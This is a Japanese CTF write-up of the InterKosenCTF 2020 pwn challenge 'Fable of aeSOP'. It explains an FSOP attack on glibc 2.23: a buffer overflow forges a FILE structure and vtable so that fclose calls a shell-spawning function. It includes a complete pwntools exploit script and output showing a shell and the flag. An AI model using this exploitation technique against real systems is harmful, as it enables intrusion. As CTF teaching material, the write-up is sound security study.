---
tags: pwn, ctf
---

# InterKosenCTF 2020 - Fable of aeSOP

* 運営Writeup: <https://hackmd.io/@theoldmoon0602/ryUYvUQC8>
* 問題リポジトリ: <https://github.com/theoremoon/InterKosenCTF2020-challenges>
* これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

FSOP入門問題。libc 2.23なのでvtableが存在するアドレスのチェックは行われない。
ここに飛べばシェルあげるよっていう関数(win)があるアドレスをくれる、ついでにコードの配置アドレスをリーク出来る。
.bssセクションで任意長のBOFが出来、ここにファイルディスクリプタへのポインタがあるのでここを偽装したファイル構造体を指すよう書き換え、その中のvtableを指すポインタがwinのアドレスを敷き詰めただけのvtableを指すようにする。

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.23

Ghidraのデコンパイルは次の通り(main関数)

```c=
ulong main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  bool bVar2;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fd_DAT_00302260 = fopen("banner.txt","r");
  bVar2 = fd_DAT_00302260 != (FILE *)0x0;
  if (bVar2) {
    fread(&buf_DAT_00302060,1,0x200,fd_DAT_00302260);
    puts(&buf_DAT_00302060);
    FUN_00100ac9();
    fclose(fd_DAT_00302260);
  }
  else {
    perror("banner.txt");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)!bVar2;
}
```

`banner.txt`を読んだ後に`FUN_00100ac9`へ飛んでいる。ここのデコンパイルは次の通り

```c=

void FUN_00100ac9(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("<win> = %p\n",FUN_00100a5a);
  gets(&buf_DAT_00302060);
  puts(&buf_DAT_00302060);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

まずwinというアドレスをくれる。察しが付くと思うのでデコンパイル結果は表示しないが、そこへ飛ぶとシェルが起動する(おめでとうメッセージも出力される)。
winはELFに含まれるのでこのアドレスからELFの配置アドレス(以下codebase)を特定出来る。

`gets`があるので自明なBOFが出来る。
ここでmainで用意したファイルディスクリプタ(以下fd)を指すポインタは`codebase + 0x202260`にあり(Ghidraだと何故か+0x100000されて`0x302060`ですがこれは謎の仕様なので無視します)、入力バッファは`codebase + 0x202060`なのでfdを指すポインタを上書き出来る。
というわけで入力バッファ上に適当に偽装したfdを用意し、そこを指すようにポインタを上書きする。また、偽装されたfdは当然vtableを指すポインタも偽装出来るので、同じく入力バッファ上に偽装したvtableを用意しそこを指すようにする。
このvtableは`fclose`に合わせて呼ばれるので`_IO_file_finish`や`_IO_file_close`にwinを設定すればよいが、面倒なので全部の関数ポインタにwinのアドレスを敷き詰めた(は?)

実際に送ったペイロードは次のような感じになっている。

```
codebase + 0x202060: fake fd
...                : padding
codebase + 0x202260: pointer to fake fd
codebase + 0x202270: fake vtable (only win address)
```

## Code

\_IO\_FILE構造体の偽装は[Pwn2Win CTF 2020 - At Your Command](/@Xornet/Bk6thFSxD)を殆どパクった(+gdbでメモリ覗いてそれっぽい値を入れた)。

```python=
from pwn import remote, process, ELF, p64, u64


if __name__ == '__main__':
    s = process("./chall")
    target = "pwn.kosenctf.com"
    port = 9003
    s = remote(target, port)

    s.recvuntil("<win> = 0x")
    win_addr = int(s.recvline().rstrip(), 16)
    print(hex(win_addr))

    offsets = {
        "win": 0xa5a,
        "buf": 0x202060,
        "fd_p": 0x202260
    }
    codebase = win_addr - offsets["win"]
    
    payload = b""
    fake_fd = p64(0xfbad1800)
    fake_fd += p64(0) * 13
    fake_fd += p64(3)
    fake_fd += p64(0) * 2
    null_addr = codebase + offsets["buf"] + 0x8
    fake_fd += p64(null_addr)  # _lock (null address)
    fake_fd += p64(0xffffffffffffffff)
    fake_fd += p64(0)
    fake_fd += p64(null_addr + 0x10)  # ???
    fake_fd += p64(0) * 3
    fake_fd += p64(0xffffffff)
    fake_fd += p64(0) * 2
    fake_fd += p64(codebase + offsets["fd_p"] + 0x10)  # pointer to fake_vtable
    fake_vtable = p64(win_addr) * 11 * 2

    payload = fake_fd + b"a" * (0x200 - len(fake_fd)) + p64(codebase + offsets["buf"]) + p64(0) + fake_vtable

    s.sendline(payload)

    s.interactive()
```

## Flag

当日は別のチームメイトが解いていましたが、まだ鯖が生きている上にFSOPだったという事以外聞いていなかったので自分で解きました

`KosenCTF{FS0P_1s_s1mpl3_4nd_fun!}`

Exploitを走らせた結果はこんな感じ(`xplt`は`python exploit.py`のエイリアスです)

```
$ xplt
[+] Starting local process './chall': pid 1162
[+] Opening connection to pwn.kosenctf.com on port 9003: Done
0x55da872c7a5a
[*] Switching to interactive mode

Congratulations!
$ ls
banner.txt
chall
flag.txt
redir.sh
$ cat flag.txt
KosenCTF{FS0P_1s_s1mpl3_4nd_fun!}
```

## 余談

最初WSL(16.04)でやっていたんですが、winのアドレスが`codebase + a5a`にあり、WSLはなぜか`codebase`が0x100000の倍数になるので(普通は0x1000の倍数)winのアドレスの下バイトが`0a5a`になってしまいました。
このせいでペイロードを送る際にwinのアドレスが改行文字判定になって送る事が出来ず、失敗したのでデバッグ無しで気合で通しました(は?)。

2.23の問題は最近のlibc強化のせいで結構見るのでぼちぼちWSL以外のまともな環境を用意したいところです(2.27だけある)

## 感想

FSOP入門、という感じの問題で良い復習(というかリハビリ)になりました。
だいたい[Pwn2Win CTF 2020 - At Your Command](/@Xornet/Bk6thFSxD)でやった事の簡易版です。あちらと違って2.23だとvtableのあるアドレスのチェックをしないので`_IO_str_overflow`や`_IO_str_finish`に飛ばさなくても雑なvtableを用意するだけで動いてくれます、楽。

出前味噌ですが、ここで何度か挙げているAt Your Commandの記事はFSOPに関して結構丁寧に書いたつもりなので2.27でFSOPがしたい人やそもそもFSOPとはなんぞやという人は是非読んでください
